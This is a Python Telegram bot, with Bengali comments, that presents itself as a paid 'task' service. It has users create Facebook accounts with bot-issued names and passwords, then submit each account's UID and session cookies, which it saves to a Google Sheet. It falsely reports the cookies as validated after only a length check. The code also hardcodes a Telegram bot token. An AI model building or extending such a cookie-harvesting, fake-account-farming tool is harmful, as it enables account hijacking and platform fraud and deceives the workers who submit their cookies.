import random
import string
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    CallbackQueryHandler,
    MessageHandler,
    filters,
)
import gspread
from oauth2client.service_account import ServiceAccountCredentials

# --- [GOOGLE SHEETS SETUP] ---
scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
try:
    creds = ServiceAccountCredentials.from_json_keyfile_name("credentials.json", scope)
    client = gspread.authorize(creds)
    SPREADSHEET_NAME = "Daily Earn Bot Database"
except Exception as e:
    print(f"Google Sheet Auth Error: {e}")

def save_to_sheet(task_category, data_row):
    try:
        spreadsheet = client.open(SPREADSHEET_NAME)
        today_date = datetime.now().strftime("%Y-%m-%d")
        sheet_title = f"{task_category}_{today_date}"
        
        try:
            worksheet = spreadsheet.worksheet(sheet_title)
        except gspread.exceptions.WorksheetNotFound:
            worksheet = spreadsheet.add_worksheet(title=sheet_title, rows="1000", cols="10")
            worksheet.append_row(["Timestamp", "Telegram ID", "Username", "Submitted Data", "Status"])
            
        worksheet.append_row(data_row)
    except Exception as e:
        print(f"Sheet Save Error: {e}")

# ১. স্টার্ট কমান্ড ও মেইন মেনু
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # সব ডাটা ক্লিয়ার করে দেওয়া যাতে বট কখনো আটকে না থাকে
    context.user_data.clear()
    
    keyboard = [
        ["🚀 Start Work", "💰 Balance"],
        ["💸 Withdraw", "👥 Referrals"],
        ["🏆 Leaderboard", "📊 Statistics"],
        ["🎧 Support", "❓ Help"]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    user_name = update.effective_user.first_name
    await update.message.reply_text(f"Hello, {user_name}! 👋\n\nWelcome to the Task Bot. Choose an option below:", reply_markup=reply_markup)

# ২. সব ধরনের মেসেজ এবং বাটন ক্লিক হ্যান্ডল করার ফাংশন
async def handle_all_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # যদি ইনলাইন বাটন ক্লিক করা হয়
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        data = query.data
        
        if data == "fb_cookies_task":
            rand_name = f"User_{random.randint(1000, 9999)}"
            rand_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            
            # ইউজারের স্টেট সেভ রাখা
            context.user_data['step'] = 'waiting_uid'
            context.user_data['temp_name'] = rand_name
            context.user_data['temp_pass'] = rand_pass
            
            text = (
                f"📂 **Facebook Account (Cookies Only)**\n\n"
                f"👤 **Name:** {rand_name}\n"
                f"🔑 **Password:** {rand_pass}\n\n"
                f"1️⃣ Create a Facebook account using these details.\n"
                f"2️⃣ Send your account UID in chat right now."
            )
            keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_task")]]
            await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
            
        elif data == "cancel_task":
            context.user_data.clear()
            await query.message.edit_text("❌ Task process cancelled. Click /start to go back to the menu.")
        return

    # যদি ইউজার টেক্সট লেখে বা পাঠায়
    text = update.message.text
    
    if text == "🚀 Start Work":
        context.user_data.clear()
        keyboard = [
            [InlineKeyboardButton("📁 Create FB Account (Cookies Only)", callback_data="fb_cookies_task")],
            [InlineKeyboardButton("❌ Cancel Process", callback_data="cancel_task")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("📌 Select a task category:", reply_markup=reply_markup)
        
    elif text == "💰 Balance":
        await update.message.reply_text("👤 Your Current Balance: $0.000\n✨ Complete tasks to earn more!")
        
    elif text == "💸 Withdraw":
        await update.message.reply_text("💳 Minimum withdraw is $1.00.\nPlease select your payment method (bKash/Nagad).")
        
    else:
        # ইউজার যদি টাস্কের ভেতরে থাকে এবং UID বা Cookies পাঠায়
        current_step = context.user_data.get('step')
        
        if current_step == 'waiting_uid':
            user_uid = text
            context.user_data['submitted_uid'] = user_uid
            context.user_data['step'] = 'waiting_cookies'
            
            await update.message.reply_text("✅ UID Saved.\n\n🍪 Now please paste the Facebook Cookies:")
            
        elif current_step == 'waiting_cookies':
            cookies_data = text
            telegram_id = update.effective_user.id
            username = update.effective_user.username or "No Username"
            user_uid = context.user_data.get('submitted_uid', 'N/A')
            
            await update.message.reply_text("⏳ Checking Facebook cookies... Please wait.")
            
            if len(cookies_data) > 10:  
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                final_data = f"UID: {user_uid} | Cookies: {cookies_data}"
                
                # গুগল শিটে সেভ করা
                save_to_sheet("FB_Cookies", [timestamp, str(telegram_id), str(username), final_data, "Approved"])
                
                await update.message.reply_text("✅ Facebook Cookies Valid!\n🎉 Task completed successfully! $0.050 added to your pending balance.")
            else:
                await update.message.reply_text("❌ Facebook Cookies Invalid or Expired!\nThe bot rejected the cookies.")
                
            # কাজ শেষে স্টেট ক্লিয়ার করে দেওয়া যাতে বট ফ্রী থাকে
            context.user_data.clear()
        else:
            await update.message.reply_text("💡 Please use the menu buttons below or type /start to reset.")

def main():
    TOKEN = "8980706201:AAHmK_q9vcStJiTbd-m1HGaDjbYhga3pfps"
    application = Application.builder().token(TOKEN).build()
    
    # সাধারণ হ্যান্ডলার যা কখনো ফ্রিজ বা ব্লক হবে না
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(handle_all_messages))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_messages))
    
    print("Bot is running smoothly without conversation lock...")
    application.run_polling()

if __name__ == "__main__":
    main()
